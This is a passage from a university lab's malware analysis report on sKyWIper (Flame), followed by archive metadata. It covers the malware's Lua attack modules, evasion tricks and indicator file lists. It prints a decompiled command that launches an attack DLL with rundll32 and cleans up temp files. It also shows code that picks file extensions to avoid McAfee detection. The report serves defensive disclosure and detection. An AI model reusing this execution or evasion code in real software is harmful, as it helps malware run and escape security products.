(Account Name, User\nName and IP address)\n\nEvent Id: 540 – Refers to successful network logon. Among various parameters the log stores\nthe User Name and Source Network Address as well.\n\nEvent Id: 672 – Refers to Authentication Ticket Granted Audit event. In case of Windows, the\nKerberos authentication uses the optional pre-authentication phase before issuing an\nauthentication ticket by checking the credentials of the client. If the client successfully\nauthenticated to the workstation, Windows puts a log entry with event id 672 into the\nSecurity log in order to demonstrate the successful initial logon event.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 48\n\n\n-----\n\nEvent Id 673: - Refers to Service Ticket Granted Audit event. Once the authentication ticket\nis granted a service ticket have to be gained. If it is so, the client could successfully logon to\nthe domain, and Windows puts a log entry with the 673 event Id to the Security Log.\n\nEvent Id 680: - Refers to Account Used for Logon by: <authentication package> .\n\n**_json.lua: json related string functions only_**\n\n**_casafety.lua: “CLANattack safety” tries to find out processes, registry information and_**\nsimilar related to ESET, KAV, McAfee, TrendMicro, and list from THREATENING_\nPROGRAMS. Basically it’s used to get information on how secure is to use the host\nfrom the perspective of the attacker.\n\nSome file names that are referred from code:\n\nATTACK_FLAME_STARTLEAK: uses \"%temp%\\\\~txqvsl.tmp\"\nATTACKOP_FLASK_PRODS: uses \"%temp%\\\\~mso2a2.tmp\"\nATTACKOP_JIMMY_PRODS: uses \"%temp%\\\\~dra53.tmp\"\n4784.dll creates the ~dra52.tmp and ~a29.tmp\n\n**_ATTACKOP_JIMMY.lua:_**\n\nctx.exec:exec({cmdLine = ctx.transport:expandLocal(string.format(\"cmd /c cd\n\\\"%%temp%%\\\" &&(if exist \\\"%s\\\" start /wait rundll32 \\\"%s\\\",%s)&move /y\n\\\"%%_systemroot%%\\\\temp\\\\~dra52.tmp\\\" \\\"~dra53.tmp\\\" &del /q \\\"%s\\\"\",\nremoteDLLBasename, remoteDLLBasename, dllExportedFunction, remoteDLLBasename)),\nmofInfo = {confPath = \"LUA.CLAN.JIMMY_MOF\", fn = \"svchost1ex.mof\"}})\n\nBelow is a description of the attack DLL files used in the Jimmy attack.\n```\n00004784.dll – jimmy.dll – contains resource 164 “BIN” \n-Resource 164 - ~60kbyte file, lot of 0x00 bytes, sparse information contains extensions and string “Comodo” - encrypted\n00005729.dll\n00006411.dll\n00004069.exe \n\n```\n**Figure 45 – Internal executables/DLLs found in mssecmgr (main module)**\n```\nATTACKOP_FLAME.luac\nATTACKOP_FLAME_PRODS.luac\nATTACKOP_FLAME_STARTLEAK.luac\nATTACKOP_FLASK.luac\nATTACKOP_FLASK_PRODS.luac\nATTACKOP_JIMMY.luac\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 49\n\n\n-----\n\n|ATTACKOP_JIMMY_PRODS.luac ATTACKOP_MOVEFILE.luac ATTACKOP_RUNDLL.luac CRUISE_CRED.luac IMMED_ATTACK_ACTION.luac MUNCH_ATTACKED_ACTION.luac MUNCH_SHOULD_ATTACK.luac NETVIEW_HANDLER.luac NETVIEW_SPOTTER.luac REG_SAFETY.luac RESCH_EXEC.luac SECLOG_HANDLER.luac SECLOG_SPOTTER.luac SNACK_BROWSER_HANDLER.luac SNACK_ENTITY_ACTION.luac SNACK_NBNS_HANDLER.luac STD.luac SUCCESS_FLAME.luac SUCCESS_FLAME_STARTLEAK.luac SUCCESS_GET_PRODS.luac TRANSPORT_NUSYSTEM.luac TRANSPORT_NU_DUSER.luac USERPASS_CRED.luac WMI_EXEC.luac WMI_SAFETY.luac attackop_base_prods.luac attackop_base_sendfile.luac basic_info_app.luac casafety.luac clan_entities.luac clan_seclog.luac euphoria_app.luac event_writer.luac fio.luac flame_props.luac get_cmd_app.luac inline_script.luac (possibly multiple) json.luac leak_app.luac libclanattack.luac libclandb.luac libcommon.luac libdb.luac libflamebackdoor.luac liblog.luac libmmio.luac libmmstr.luac libnetutils.luac|Col2|\n|---|---|\n\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 50\n\n\n-----\n\n|libplugins.luac libwmi.luac main_app.luac payload_logger.luac post_cmd_app.luac rts_common.luac storage_manager.luac table_ext.luac transport_nu_base.luac|Col2|\n|---|---|\n\n\n**Figure 46 – List of LUA scripts found in sKyWIper**\n\n### 6.2. Related files\n\n**_0004784.dll (Jimmy.dll)_**\n\n0004784.dll is part of the “Jimmy” attack hence we use the name jimmy.dll. It contains the\nstring\n```\n“c:\\Projects\\Jimmy\\jimmydll_v2.0\\JimmyForClan\\Jimmy\\bin\\srelease\\jimmydll\\i\nndsvc32.pdb”. \n\n```\n0004784.dll (jimmy.dll) can be extracted from decompressed resource 146 at position\n0x2561F3.\n\nBy running the jimmy.dll with rundll32 jimmy.dll, QDInit, it starts to produce files ~a29.tmp\nand ~dra52.tmp. (QDInit == Quick Disk Inspection?) Related information can be found in lua\nfiles:\n```\nATTACKOP_JIMMY.lua:    ctx.exec:exec({cmdLine =\nctx.transport:expandLocal(string.format(\"cmd /c cd \\\"%%temp%%\\\" &&(if exist \\\"%s\\\"\nstart /wait rundll32 \\\"%s\\\",%s)&move /y \\\"%%_systemroot%%\\\\temp\\\\~dra52.tmp\\\"\n\\\"~dra53.tmp\\\" &del /q \\\"%s\\\"\", remoteDLLBasename, remoteDLLBasename,\ndllExportedFunction, remoteDLLBasename)), mofInfo = {confPath =\n\"LUA.CLAN.JIMMY_MOF\", fn = \"svchost1ex.mof\"}})\n\n```\n**Figure 47 – Jimmy temp files reference in Lua script ATTACKOP_JIMMY.lua**\n\nThe produced ~dra52.tmp in our samples contained around 580 byte compressed data\n(PPMd) on some partial file listings related information of some (5-10) files of the file\nsystem. The remaining data is compressed or encrypted.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 51\n\n\n-----\n\nMost likely jimmy.dll is capable to grab screenshots and other modules perform other\ninformation stealing tasks.\n\nIf we run the jimmy.dll manually with rundll32, ~a29.tmp contains 12 bytes, bytes pos 0x40x7 are different on different systems, other bytes match.\n\n**_00004069.exe_**\n\n00004069.exe registers itself under the name “Windows Management Instrumentation\nConfigurator”, and contains references to %windir%\\system32\\rdcvlt32.exe\n%temp%\\sl84.tmp WinInit.INI and other files.\n\n### 6.3. SQLite table structure of CLAN DB \n\nAttack and other information is stored in SQLite and unknown “CLAN” databases.\n\nThe dstrlog structure is described below. It appears unusual to use databases to store attack\nrelated information inside the malware, but apparently this is the case: mssecmgr.dll\ncontains DB2 ODBC references inside (unknown goal) and attack strings contain Oracle\nreferences as well (most likely for information gathering).\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 52\n\n\n-----\n\n**Figure 48 –dstrlog structure, part 1**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 53\n\n\n-----\n\n**Figure 49 –dstrlog structure, part 2**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 54\n\n\n-----\n\n**Figure 50 –dstrlog structure, part 3**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 55\n\n\n-----\n\n## 7. Evasion techniques\n\n### 7.1. Security programs relation\n\nThe authors took extra precautions to evade detection by security products. The list is so\ncomprehensive it is rarely seen. A very similar list can be found in the ccalc32drv.sys file,\nwhere table DangerousProcesses contains 346 items. We do not disclose the list as it could\nserve other malware authors for their goals.\n\n### 7.2. Design choices and tricks\n\nIt can clearly be seen that this malware was continuously developed over a long time period\nand it employs several tricks to evade security products. For example, the extensions are\nchosen according to the detected anti-malware products. We found that the malware\nusually uses the .ocx extension, but this decision is based on how to get best under the\nradar. In case of McAfee McShield installed, the preferred extension is changed to .tmp as\nseen in the decompiled code segment below.\n```\n    Transport.getPreferredDLLExtension = function(l_10_0)\n      local remoteProcs = l_10_0.ctx.remoteSafety:procList()\n      local gotMcShield = false\n      for pid,exe in pairs(remoteProcs) do\n       if string.lower(exe) == \"mcshield.exe\" then\n        gotMcShield = true\n      else\n       end\n      end\n      if gotMcShield then\n       log.writeEx(-1453109576, 189173052,\nlog.colons(tostring(l_10_0.ctx.tgt), \"tmp\"))\n       return \"tmp\"\n      else\n       return \"ocx\"\n      end\n        end\n\n```\n**Figure 51 – Extension selection based on active A/V system**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 56\n\n\n-----\n\n### 7.3. Malware’s own files list\n\nsKyWIper puts its own files on a whitelist. Extra care should be taken of these files and\nconstants, and they should possibly be put into IDS/IPS signatures:\n```\npreg.exe\nntcache.dat\nlmcache.dat\nrccache.dat\ndcomm.dat\ndmmsapi.dat\n~dra52.tmp\ncommgr32\ntarget.lnk\nccalc32.sys\nauthentication packages\nzff042\nurpd.ocx\nPcldrvx.ocx\n~KWI\nguninst32\n~HLV\n~DEB93D.tmp\nlib.ocx\nlss.ocx\n~DEB83C.tmp\nstamn32\n~dra53.tmp\nnteps32\ncmutlcfg.ocx\n~DFL983.tmp\n~DF05AC8.tmp\n~DFD85D3.tmp\n~a29.tmp\ndsmgr.ocx\n~f28.tmp\ndesc.ini\nfib32.bat\n~d43a37b.tmp\n~dfc855.tmp\nEf_trace.log\ncontents.btr\nwrm3f0\nscrcons.exe\nwmiprvse.exe\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 57\n\n\n-----\n\n|wlndh32 mprhlp kbdinai services.exe ~ZLM0D1.ocx ~ZLM0D2.ocx sstab m4aaux.dat explorer.exe gppref32.exe inje svchost iexplore SeCEdit ~nms534 Windows Authentication Client Manager Windows NT Enhanced Processing Service ~rcf0 ~rcj0|Col2|\n|---|---|\n\n\n**Figure 52 –Strings found in winlogon memory dump**\n\nCcalc32drv.sys contains configuration settings for the malware. A part of it is a table\n“Exposureindicating” which should most likely mostly relate to the malware’s own files.\n```\nExposureIndicating.1 audcache\nExposureIndicating.2 audfilter.dat\nExposureIndicating.3n ~ia33.tmp\nExposureIndicating.4 commgr32\nExposureIndicating.5 nteps32\nExposureIndicating.6 ~f28.tmp\nExposureIndicating.7 dsmgr.ocx\nExposureIndicating.8 ~nms534\nExposureIndicating.9 m4aaux.dat\nExposureIndicating.10 mpgaud.dat\nExposureIndicating.11 msaudio\nExposureIndicating.12 mspbee32\nExposureIndicating.13 ~a49.tmp\nExposureIndicating.14 mssvc32.ocx\nExposureIndicating.15 ~a38.tmp\nExposureIndicating.16 MSAudio\nExposureIndicating.17 boot32drv.sys\nExposureIndicating.18 wave9\nExposureIndicating.19 wavesup3.drv\nExposureIndicating.20 wpgfilter.dat\nExposureIndicating.21 MSSecurityMgr\nExposureIndicating.22 ssitable\nExposureIndicating.23 mssecmgr.ocx\nExposureIndicating.24 modevga.com\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 58\n\n\n-----\n\n|ExposureIndicating.25 soapr32.ocx ExposureIndicating.26 indsvc32.ocx ExposureIndicating.27 ~mso2a0.tmp ExposureIndicating.28 ~mso2a2.tmp ExposureIndicating.29 netprot32 ExposureIndicating.30 mssui.drv ExposureIndicating.31 preg.exe ExposureIndicating.32 ntcache.dat ExposureIndicating.33 lmcache.dat ExposureIndicating.34 rccache.dat ExposureIndicating.35 dcomm.dat ExposureIndicating.36 dmmsapi.dat ExposureIndicating.37 authentication packages ExposureIndicating.38 zff042 ExposureIndicating.39 indsvc32b.ocx ExposureIndicating.40 ~dra52.tmp ExposureIndicating.41 ~KWI ExposureIndicating.42 ccalc32.sys ExposureIndicating.43 ~HLV ExposureIndicating.44 urpd.ocx ExposureIndicating.45 lib.ocx ExposureIndicating.46 lss.ocx ExposureIndicating.47 target.lnk ExposureIndicating.48 stamn32 ExposureIndicating.49 guninst32 ExposureIndicating.50 ~DEB13DE.tmp ExposureIndicating.51 Pcldrvx.ocx ExposureIndicating.52 nddesp32.ocx ExposureIndicating.53 cmutlcfg.ocx ExposureIndicating.54 ~DEB93D.tmp ExposureIndicating.55 ~DEB83C.tmp ExposureIndicating.56 ~dra53.tmp ExposureIndicating.57 ~DFL983.tmp ExposureIndicating.58 ~a29.tmp ExposureIndicating.59 ~DF05AC8.tmp ExposureIndicating.60 ~DFD85D3.tmp ExposureIndicating.61 ~d43a37b.tmp ExposureIndicating.62 wrm3f0 ExposureIndicating.63 desc.ini ExposureIndicating.64 Ef_trace.log ExposureIndicating.65 wlndh32 ExposureIndicating.66 mprhlp ExposureIndicating.67 kbdinai ExposureIndicating.68 contents.btr ExposureIndicating.69 fib32.bat ExposureIndicating.70 sstab ExposureIndicating.71 scrcons.exe ExposureIndicating.72 wmiprvse.exe ExposureIndicating.73 services.exe ExposureIndicating.74 explorer.exe ExposureIndicating.75 inje ExposureIndicating.76 svchost ExposureIndicating.77 gppref32.exe|Col2|\n|---|---|\n\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 59\n\n\n-----\n\n|ExposureIndicating.78 ~dfc855.tmp ExposureIndicating.79 SeCEdit ExposureIndicating.80 DefaultEnvironment ExposureIndicating.81 LastUsedIdentifier ExposureIndicating.82 Windows Authentication Client Manager ExposureIndicating.83 Windows NT Enhanced Processing Service ExposureIndicating.84 ~rcf0 ExposureIndicating.85 ~rcj0 ExposureIndicating.86 ~ZLM0D1.ocx ExposureIndicating.87 ~ZLM0D2.ocx ExposureIndicating.88 Delayed Write Failed ExposureIndicating.89 iexplore ExposureIndicating.90 cgi-bin\\counter.cgi ExposureIndicating.91 Mon.com ExposureIndicating.92 Mon.exe ExposureIndicating.93 ~ekz167.tmp ExposureIndicating.94 ~zwp129.tmp ExposureIndicating.95 ~dfc634.tmp ExposureIndicating.96 ~dfc551.tmp ExposureIndicating.97 ~dfc412.tmp ExposureIndicating.98 tftp.exe ExposureIndicating.99 csvde.exe ExposureIndicating.100 dstrlog.dat ExposureIndicating.101 dstrlogh.dat ExposureIndicating.102 ~ZFF ExposureIndicating.103 ~ZLM ExposureIndicating.104 ~PCY ExposureIndicating.105 Firefox\\profiles ExposureIndicating.106 advnetcfg ExposureIndicating.107 hub001.dat ExposureIndicating.108 hub002.dat ExposureIndicating.109 .MSBTS ExposureIndicating.110 D:\\.. ExposureIndicating.111 E:\\.. ExposureIndicating.112 F:\\.. ExposureIndicating.113 G:\\.. ExposureIndicating.114 H:\\.. ExposureIndicating.115 watchxb.sys ExposureIndicating.116 ntaps.dat ExposureIndicating.117 netcfgi.ocx ExposureIndicating.118 advpck.dat ٯ ExposureIndicating.119 Advanced Network Configuration ExposureIndicating.120 commgr32.dll ExposureIndicating.121 comspol32.dll ExposureIndicating.122 ~rf288.tmp ExposureIndicating.123 msglu32.ocx ExposureIndicating.124 Windows Indexing Service ExposureIndicating.125 Remote Procedure Call Namespace Client ExposureIndicating.126 rpcnc.dat ExposureIndicating.127 sndmix.drv ExposureIndicating.128 fmpidx.bin ExposureIndicating.129 tokencpt ExposureIndicating.130 Windows Client Manager ExposureIndicating.131 secindex|Col2|\n|---|---|\n\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 60\n\n\n-----\n\n|ExposureIndicating.132 mixercfg.dat ExposureIndicating.133 audtable.dat ExposureIndicating.134 mixerdef.dat ExposureIndicating.135 MSSndMix ExposureIndicating.136 MSAuthCtrl ExposureIndicating.137 authpack.ocx ExposureIndicating.138 posttab.bin ExposureIndicating.139 lrlogic ExposureIndicating.140 lmcache.dat ExposureIndicating.141 ctrllist.dat ExposureIndicating.142 authcfg.dat ExposureIndicating.143 dcomm ExposureIndicating.144 dmmsapi|Col2|\n|---|---|\n\n\n**Figure 53 – List of the malware’s configuration settings – most likely contains the malware’s own files**\n\nPossible other related parts from different sources:\n```\nSUICIDE.RESIDUAL_FILES.A [NoValue]->%temp%\\~a28.tmp\nSUICIDE.RESIDUAL_FILES.B [NoValue]->%temp%\\~DFL542.tmp\nSUICIDE.RESIDUAL_FILES.C [NoValue]->%temp%\\~DFL543.tmp\nSUICIDE.RESIDUAL_FILES.D [NoValue]->%temp%\\~DFL544.tmp\nSUICIDE.RESIDUAL_FILES.E [NoValue]->%temp%\\~DFL545.tmp\nSUICIDE.RESIDUAL_FILES.F [NoValue]->%temp%\\~DFL546.tmp\nSUICIDE.RESIDUAL_FILES.G [NoValue]->%temp%\\~dra51.tmp\nSUICIDE.RESIDUAL_FILES.H [NoValue]->%temp%\\~dra52.tmp\nSUICIDE.RESIDUAL_FILES.I [NoValue]->%temp%\\~fghz.tmp\nSUICIDE.RESIDUAL_FILES.J [NoValue]->%temp%\\~rei524.tmp\nSUICIDE.RESIDUAL_FILES.K [NoValue]->%temp%\\~rei525.tmp\nSUICIDE.RESIDUAL_FILES.L [NoValue]->%temp%\\~TFL848.tmp\nSUICIDE.RESIDUAL_FILES.M [NoValue]->%temp%\\~TFL842.tmp\nSUICIDE.RESIDUAL_FILES.O [NoValue]->%temp%\\GRb2M2.bat\nSUICIDE.RESIDUAL_FILES.P [NoValue]->%temp%\\indsvc32.ocx\nSUICIDE.RESIDUAL_FILES.Q [NoValue]->%temp%\\scaud32.exe\nSUICIDE.RESIDUAL_FILES.R [NoValue]->%temp%\\scsec32.exe\nSUICIDE.RESIDUAL_FILES.S [NoValue]->%temp%\\sdclt32.exe\nSUICIDE.RESIDUAL_FILES.T [NoValue]->%temp%\\sstab.dat\nSUICIDE.RESIDUAL_FILES.U [NoValue]->%temp%\\sstab15.dat\nSUICIDE.RESIDUAL_FILES.V [NoValue]->%temp%\\winrt32.dll\nSUICIDE.RESIDUAL_FILES.W [NoValue]->%temp%\\winrt32.ocx\nSUICIDE.RESIDUAL_FILES.X [NoValue]->%temp%\\wpab32.bat\nSUICIDE.RESIDUAL_FILES.T [NoValue]->%windir%\\system32\\commgr32.dll\nSUICIDE.RESIDUAL_FILES.A1 [NoValue]->%windir%\\system32\\comspol32.dll\nSUICIDE.RESIDUAL_FILES.A2 [NoValue]->%windir%\\system32\\comspol32.ocx\nSUICIDE.RESIDUAL_FILES.A3 [NoValue]->%windir%\\system32\\indsvc32.dll\nSUICIDE.RESIDUAL_FILES.A4 [NoValue]->%windir%\\system32\\indsvc32.ocx\nSUICIDE.RESIDUAL_FILES.A5 [NoValue]->%windir%\\system32\\modevga.com\nSUICIDE.RESIDUAL_FILES.A6 [NoValue]->%windir%\\system32\\mssui.drv\nSUICIDE.RESIDUAL_FILES.A7 [NoValue]->%windir%\\system32\\scaud32.exe\nSUICIDE.RESIDUAL_FILES.A8 [NoValue]->%windir%\\system32\\sdclt32.exe\nSUICIDE.RESIDUAL_FILES.A2 [NoValue]->%windir%\\system32\\watchxb.sys\nSUICIDE.RESIDUAL_FILES.A10 [NoValue]->%windir%\\system32\\winconf32.ocx\nSUICIDE.RESIDUAL_FILES.A11 [NoValue]->%windir%\\system32\\mssvc32.ocx\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 61\n\n\n-----\n\n|SUICIDE.RESIDUAL_FILES.A12 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSSecurityMgr\\rccache.dat SUICIDE.RESIDUAL_FILES.A13 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSSecurityMgr\\dstrlog.dat SUICIDE.RESIDUAL_FILES.A14 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSAudio\\dstrlog.dat SUICIDE.RESIDUAL_FILES.A15 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSSecurityMgr\\dstrlogh.dat SUICIDE.RESIDUAL_FILES.A16 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSAudio\\dstrlogh.dat SUICIDE.RESIDUAL_FILES.A17 [NoValue]->%SYSTEMROOT%\\Temp\\~8C5FF6C.tmp SUICIDE.RESIDUAL_FILES.A18 [NoValue]->%windir%\\system32\\sstab0.dat SUICIDE.RESIDUAL_FILES.A12 [NoValue]->%windir%\\system32\\sstab1.dat SUICIDE.RESIDUAL_FILES.A20 [NoValue]->%windir%\\system32\\sstab2.dat SUICIDE.RESIDUAL_FILES.A21 [NoValue]->%windir%\\system32\\sstab3.dat SUICIDE.RESIDUAL_FILES.A22 [NoValue]->%windir%\\system32\\sstab4.dat SUICIDE.RESIDUAL_FILES.A23 [NoValue]->%windir%\\system32\\sstab5.dat SUICIDE.RESIDUAL_FILES.A24 [NoValue]->%windir%\\system32\\sstab6.dat SUICIDE.RESIDUAL_FILES.A25 [NoValue]->%windir%\\system32\\sstab7.dat SUICIDE.RESIDUAL_FILES.A26 [NoValue]->%windir%\\system32\\sstab8.dat SUICIDE.RESIDUAL_FILES.A27 [NoValue]->%windir%\\system32\\sstab2.dat SUICIDE.RESIDUAL_FILES.A28 [NoValue]->%windir%\\system32\\sstab10.dat SUICIDE.RESIDUAL_FILES.A22 [NoValue]->%windir%\\system32\\sstab.dat SUICIDE.RESIDUAL_FILES.B1 [NoValue]->%temp%\\~HLV751.tmp SUICIDE.RESIDUAL_FILES.B2 [NoValue]->%temp%\\~KWI288.tmp SUICIDE.RESIDUAL_FILES.B3 [NoValue]->%temp%\\~KWI282.tmp SUICIDE.RESIDUAL_FILES.B4 [NoValue]->%temp%\\~HLV084.tmp SUICIDE.RESIDUAL_FILES.B5 [NoValue]->%temp%\\~HLV224.tmp SUICIDE.RESIDUAL_FILES.B6 [NoValue]->%temp%\\~HLV227.tmp SUICIDE.RESIDUAL_FILES.B7 [NoValue]->%temp%\\~HLV473.tmp SUICIDE.RESIDUAL_FILES.B8 [NoValue]->%windir%\\system32\\nteps32.ocx SUICIDE.RESIDUAL_FILES.B2 [NoValue]->%windir%\\system32\\advnetcfg.ocx SUICIDE.RESIDUAL_FILES.B10 [NoValue]->%windir%\\system32\\ccalc32.sys SUICIDE.RESIDUAL_FILES.B11 [NoValue]->%windir%\\system32\\boot32drv.sys SUICIDE.RESIDUAL_FILES.B12 [NoValue]->%windir%\\system32\\rpcnc.dat SUICIDE.RESIDUAL_FILES.B13 [NoValue]->%windir%\\system32\\soapr32.ocx SUICIDE.RESIDUAL_FILES.B14 [NoValue]->%windir%\\system32\\ntaps.dat SUICIDE.RESIDUAL_FILES.B15 [NoValue]->%windir%\\system32\\advpck.dat SUICIDE.RESIDUAL_FILES.B16 [NoValue]->%temp%\\~rf288.tmp SUICIDE.RESIDUAL_FILES.B17 [NoValue]->%temp%\\~dra53.tmp SUICIDE.RESIDUAL_FILES.B18 [NoValue]->%systemroot%\\system32\\msglu32.ocx SUICIDE.RESIDUAL_FILES.C1 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSAuthCtrl\\authcfg.dat SUICIDE.RESIDUAL_FILES.C2 [NoValue]->%COMMONPROGRAMFILES%\\Microsoft Shared\\MSSndMix\\mixercfg.dat|Col2|\n|---|---|\n\n\n**Figure 54 – SUICIDE RESIDUAL FILES – probably also malware related (to691.tmp)**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 62\n\n\n-----\n\nPossible other related parts from different sources:\n```\n%windir%\\system32\\comspol32.dll↑ ? DisableRSO – found in res146 in F\ncompression; maybe the same as nteps32\n%windir%\\system32\\commgr32.dll↑ ? DisableRTA – The same as for\ncomspol32.dll\n\n```\n**Figure 55 –Winlogon.exe with injected code working with ccalc32.sys – procmon**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 63\n\n\n-----\n\n#### ANNEX\n\nHere we give some hint on implementing functions for which we had problems. The typical\nexample is encryption, where it is very important which parameters and implementation are\nin use, and what type of header should exist for the successful decompression.\n\nAgain, we don’t want to show best practice, we want to show at least one successful way to\nwork with the sample.\n```\n… load sample into $bufall \nuse Compress::Zlib;\nsub FlatDecoding {\nmy ($str) = @_;\nmy @ret = split('', $str);\nmy ($k, $err) = inflateInit( {-Bufsize => 1});\nmy ($ret,$z,$status) = ('','',0);\nforeach (@ret) {\n($z, $status) = $k->inflate($_);\n$ret .= $z;\nlast if $status == Z_STREAM_END or $status != Z_OK;\n}\nreturn $ret;\n}\n$bufall2=FlatDecoding($bufall);\n..save $bufall2\n\n```\n**Figure 56 – F/Inflate/Flate decompression – PERL sample code copied from the net**\n```\n… load sample into $bufall \nuse Compress::PPMd;\nmy $decoder=Compress::PPMd::Decoder->new();\n my $bufall2=$decoder->decode(substr($bufall,4));\n not be decompressed\n..save $bufall2\n\n```\n**Figure 57– PPMd decompression – PERL sample code copied from the net**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 64\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.crysys.hu/publications/files/skywiper.pdf",
        "https://app.box.com/s/ebeqddqmxdjqttnqjr1xzi7agiqusrac",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2012/2012.05.31.Flame_sKyWIper/skywiper.pdf"
    ],
    "report_names": [
        "skywiper.pdf",
        "skywiper"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1338425951,
    "ts_modification_date": 1338425951,
    "files": {
        "pdf": "https://archive.orkl.eu/6e4df95a65ad848c8192c7c76ed35d622764cab3.pdf",
        "text": "https://archive.orkl.eu/6e4df95a65ad848c8192c7c76ed35d622764cab3.txt",
        "img": "https://archive.orkl.eu/6e4df95a65ad848c8192c7c76ed35d622764cab3.jpg"
    }
}